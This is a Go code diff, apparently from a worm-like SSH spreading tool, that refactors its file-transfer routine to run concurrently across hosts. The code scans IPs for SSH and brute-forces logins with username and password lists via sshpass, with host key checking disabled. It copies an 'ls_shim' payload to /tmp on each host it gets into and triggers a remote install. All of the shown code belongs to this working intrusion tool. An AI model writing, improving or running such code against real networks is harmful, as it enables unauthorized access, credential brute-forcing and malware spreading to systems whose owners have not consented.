@@ -37,13 +37,13 @@ func main() {
 		fmt.Println("Dependencies installed")
 	}
 	if isTarget && !isDemo {
-		transferFiles([]string{targetIP})
+		transferFilesRunner([]string{targetIP})
 	} else {
 		ips := findIPs()
 		fmt.Print("IP list: ")
 		fmt.Println(ips)
 		if !isDemo {
-			transferFiles(ips)
+			transferFilesRunner(ips)
 		}
 	}
 
@@ -98,7 +98,6 @@ func runRemote(username, password, ip string) {
 		installedIPs = append(installedIPs, ip)
 		if isThreaded {
 			fmt.Println("Finished installing on " + ip)
-			wg.Done()
 		}
 	}
 }
@@ -120,54 +119,21 @@ func sshUp(ip string) bool {
 	return false
 }
 
-func transferFiles(ips []string) {
+func transferFilesRunner(ips []string) {
 	for i := 0; i < len(ips); i++ {
 		if isVerbose {
 			fmt.Println("Scanning port 22 on " + ips[i])
 		}
 		if sshUp(ips[i]) {
-			if isVerbose {
-				fmt.Println("Transferring files to " + ips[i])
+			if isThreaded {
+				fmt.Println("Checking users on " + ips[i] + " (DETACHED)")
+				wg.Add(1)
+				go transferFiles(ips[i])
+			} else {
+				transferFiles(ips[i])
 			}
-			complete := false
-			for u := 0; u < len(usernames); u++ {
-				if isVerbose {
-					fmt.Println("Trying user " + usernames[u])
-				}
-				complete = false
-				for p := 0; p < len(passwords); p++ {
-					if isVerbose {
-						command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u] + "@" + ips[i] + ":/tmp/"}
-						fmt.Println(command)
-					}
-					cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u]+"@"+ips[i]+":/tmp/")
-					err := cmd.Run()
-					if err == nil {
-						if isVerbose {
-							fmt.Println("Files sent")
-						}
-						if isThreaded {
-							wg.Add(1)
-							go runRemote(usernames[u], passwords[p], ips[i])
-						} else {
-							runRemote(usernames[u], passwords[p], ips[i])
-						}
-						complete = true
-						break
-					}
-				}
-				if complete {
-					break
-				} else {
-					if isVerbose {
-						fmt.Println("User " + usernames[u] + " failed. Trying next user...")
-					}
-				}
-			}
-			if !complete {
-				fmt.Println("Installation on " + ips[i] + " failed.")
-			}
-		} else /* if isVerbose */ {
+
+		} else {
 			fmt.Println("Host " + ips[i] + " does not have SSH enabled. Skipping...")
 		}
 	}
@@ -175,6 +141,48 @@ func transferFiles(ips []string) {
 		wg.Wait()
 	}
 
+}
+
+func transferFiles(ip string) {
+	if isVerbose {
+		fmt.Println("Transferring files to " + ip)
+	}
+	complete := false
+	for u := 0; u < len(usernames); u++ {
+		if isVerbose {
+			fmt.Println("Trying user " + usernames[u])
+		}
+		complete = false
+		for p := 0; p < len(passwords); p++ {
+			if isVerbose {
+				command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u] + "@" + ip + ":/tmp/"}
+				fmt.Println(command)
+			}
+			cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u]+"@"+ip+":/tmp/")
+			err := cmd.Run()
+			if err == nil {
+				if isVerbose {
+					fmt.Println("Files sent")
+				}
+				runRemote(usernames[u], passwords[p], ip)
+				complete = true
+				break
+			}
+		}
+		if complete {
+			break
+		} else {
+			if isVerbose {
+				fmt.Println("User " + usernames[u] + " failed. Trying next user...")
+			}
+		}
+	}
+	if !complete {
+		fmt.Println("Installation on " + ip + " failed.")
+	}
+	if isThreaded {
+		wg.Done()
+	}
 }
 
 func findIPs() []string {
